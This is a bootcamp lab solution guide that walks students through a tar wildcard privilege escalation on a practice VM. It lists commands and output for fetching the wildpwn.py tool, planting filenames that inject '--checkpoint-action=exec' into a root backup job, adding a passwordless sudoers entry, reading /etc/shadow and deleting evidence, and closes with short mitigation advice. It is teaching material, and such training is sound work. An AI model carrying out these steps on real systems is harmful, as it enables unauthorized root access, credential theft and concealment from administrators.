## Solution Guide: Exploiting `tar`

The goal of this activity is to act out the `tar` exploitation and research how to harden systems against this exploit. 

Completing this activity required the following steps: 

- Downloading `wildpwn.py` using a non-`sudo` user account. 
- Running the script to generate `.webscript`.
- Archiving the directory with `tar` to run the exploit.
- Verifying that your user can gain `sudo` access.
- Researching mitigation techniques. 

### Solutions

1. In your VM, switch to the user `jane`, and verify that you have no `sudo` privileges:

   - Run `su jane`. Use `password` as the password.

   - Run `sudo -l` to see that you do not have **super user** privileges.

### Verifying the automated backups

Look for the automatically archived `tar` backup file:

2. As `jane`:

- Run `cd ~/Documents`

- Run `ls -l` to see the archive file, `jane_docs_backup.tar`.

  ```
  -rw-r--r-- 1 root root 286720 Apr 28 18:36 jane_docs_backup.tar
  ```

### Downloading the Script

3. Download the [wildpwn.py](https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py) attack tool to your `~/Documents/ExploitTar` directory:

   - `cd ~/Documents/ExploitTar`

   - `wget https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py`

   - Check the contents of the directory before running the script with `ls -lat`:

     ```
     total 16
     drwxr-xr-x 3 jane jane 4096 Apr 28 18:40  .
     drwxr-xr-x 4 jane jane 4096 Apr 28 13:56  ..
     -rw-rw-r-- 1 jane jane 3699 Apr 28 13:54  wildpwn.py
     drwxr-xr-x 2 jane jane 4096 Apr 28 13:52 'important docs'
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f9
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f8
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f7
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f6
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f5
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f4
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f3
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f2
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f10
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f1
     ```

### Generating the Payload

4. Use `wildpwn.py` to generate the malicious files by running:

- Within the `ExploitTar` directory, run: 

- `python wildpwn.py tar .` which will show:

  ```
  [!] Selected payload: tar
  [+] Done! Now wait for something like: tar cf archive.tar * on ./. Good luck!
  ```

- Then run `ls -lat` to see our new payload files:

  ```
  total 20
  drwxr-xr-x 3 jane jane 4096 Apr 28 18:41  .
  -rw-rw-r-- 1 jane jane    0 Apr 28 18:41 '--checkpoint=1'
  -rw-rw-r-- 1 jane jane    0 Apr 28 18:41 '--checkpoint-action=exec=sh .webscript'
  -rw-rw-r-- 1 jane jane  535 Apr 28 18:41  .webscript
  drwxr-xr-x 4 jane jane 4096 Apr 28 13:56  ..
  -rw-rw-r-- 1 jane jane 3699 Apr 28 13:54  wildpwn.py
  drwxr-xr-x 2 jane jane 4096 Apr 28 13:52 'important docs'
  -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f9
  -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f8
  ...
  ...
  ```

### Verify the Payload is Staged

5. After waiting 1-2 minutes, we can re-run `ls -lat` to see that the contents of the directory have changed!

- Run `ls -lat` to see:

  ```
  total 20
  drwxr-xr-x 4 jane jane 4096 Apr 28 18:42  .
  drwxr-xr-x 2 root root 4096 Apr 28 18:42  .cache
  drwxr-xr-x 4 jane jane 4096 Apr 28 13:56  ..
  -rw-rw-r-- 1 jane jane 3699 Apr 28 13:54  wildpwn.py
  drwxr-xr-x 2 jane jane 4096 Apr 28 13:52 'important docs'
  -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f9
  -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f8
  ```

Our exploit file should exist inside of a newly created `.cache` directory, with the name, `.cachefile`. To see it:

- `ls -lat`  to show the hidden `.cache` directory

   - Recall `ls` options: 
     - `-l` will show a long-list format of the files, 
     - `-a` will show entries starting with a `.`, and 
     - `-t` will sort by _time modified_, which we want due to the nature of this exploit.

- `cd .cache` to navigate _into_ the `.cache` directory

- `ls -lat` to show the hidden `.cachefile` exploit file. 

### Execute the Exploit

6. While still in the `.cache` subdirectory, execute the `.cachefile` within the terminal:

   - `./.cachefile`  

- You'll see your user prompt change from `jane:$` to `root:#`!

### Become a Super User

7. Then, we'll want to add `jane` to `/etc/sudoers` so that we'll be able to run any command with superuser privileges. Do the following while still logged in as `root`:

   - Run `visudo` and navigate to the following section of the file:

     ```bash
     # User privilege specification
     root    ALL=(ALL:ALL) ALL
     ```

   - Under that `root` permission, add the following line and save the file:  

     ```bash
     jane   ALL=(ALL) NOPASSWD:ALL

This should allow us to run `sudo` commands as `jane` without having to enter a password.

### Test Your New Powers and Cover Your Tracks

8. Log back in as `jane` and verify that you can run commands with `sudo`. 
  
- Login back as `jane` with:  

  - `su jane`  

- Test your `sudo` permissions with:

  - `sudo -l`, and then

  - `sudo cat /etc/shadow` 

     - **Note**: If you can see the contents of this file, you have successfully carried out a `tar wildcard attack`, turning `jane` into a superuser!

     - Due to how you edited the `visudo` entry above, you shouldn't have needed  to enter your password for this command. Password-less `sudo` permissions allow attackers to rapidly execute elevated instructions on a target machine.

- Then, remove the `ExploitTar` directory entirely to cover your tracks.

  - Run `rm -r ~/Documents/ExploitTar`

Congratulations! You have successfully executed what is known as a `tar wildcard attack`! This is a more discreet attack that can be carried out on Unix-based operating system with `tar` installed.

### Preventive Measures

9. Ways to prevent this attack in the future include:

   - Preventing users from downloading files from untrusted sources. This will involve enforcing stricter **permissions** on where users can save files.

   - Using a tool like `tripwire` to watch the file system for suspicious changes. This will alert you whenever a user downloaded files like `wildpwn.py`, or when backups create files like `.cache/.cachefile`.
    
   - Use a tool like `lynis` to scan the system for security vulnerabilities on a regular basis. This will make it more likely that you will identify malicious files before they have a chance to damage the system.

### Wildcard Attack References

If you're curious about more information, visit the following references:

   - [Back To The Future: Unix Wildcards Gone Wild](https://www.exploit-db.com/papers/33930)
   - [wildpwn's GitHub page](https://github.com/localh0t/wildpwn)

--- 

Â© 2020 Trilogy Education Services, a 2U, Inc. brand.  All Rights Reserved.